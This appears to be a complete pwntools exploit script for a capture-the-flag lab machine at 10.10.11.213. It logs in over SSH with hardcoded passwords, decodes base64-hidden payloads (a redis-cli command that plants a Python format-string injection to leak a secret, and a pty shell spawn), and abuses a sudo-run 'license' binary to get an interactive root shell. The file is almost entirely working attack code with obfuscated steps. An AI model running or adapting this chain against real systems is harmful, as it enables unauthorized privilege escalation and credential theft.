import os

try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Format ~ Ninhpn\n")
except:
    print("\n[\033[1;31m!\033[1;37m] Need root or pwntools\n")
    exit(1)

def kill(sig, frame):
    print("\n[\033[1;31m-\033[1;37m] Exit...\n")
    sys.exit(1)
redis = b64d('cmVkaXMtY2xpIC1zIC92YXIvcnVuL3JlZGlzL3JlZGlzLnNvY2sgSE1TRVQgZ2V0cm9vdCBmaXJzdC1uYW1lICJ7bGljZW5zZS5fX2luaXRfXy5fX2dsb2JhbHNfX1tzZWNyZXRfZW5jb2RlZF19IiBsYXN0LW5hbWUgR0VUUk9PVCB1c2VybmFtZSBHRVRST09U')

tty = b64d('cHl0aG9uMyAtYyAiaW1wb3J0IHB0eTsgcHR5LnNwYXduKCcvYmluL2Jhc2gnKSI=')


try:
	print("\n[\033[1;31m-\033[1;37m] Trying SSH root...\n")
	request = ssh(host='10.10.11.213', user='root', password='unCR4ckaBL3Pa$$w0rd')
	shell = request.process("/bin/sh")
	shell.sendline(b"echo 'whoami?'")
	shell.sendline(b"whoami")
	time.sleep(0.3)
	shell.interactive()
except:
	print("\n[\033[1;31m-\033[1;37m] Root failed....Trying SSH cooper\n")
	print("\n[\033[1;31m-\033[1;37m] Get root password... Just SSH it..\n")
	request = ssh(host='10.10.11.213', user='cooper', password='zooperdoopercooper')
	shell = request.process("/bin/sh")
	time.sleep(0.3)
	shell.sendline(redis)
	shell.sendline(b"sudo /usr/bin/license -p getroot")
	time.sleep(0.3)
	shell.sendline(b"zooperdoopercooper")
	time.sleep(0.3)
	shell.interactive()
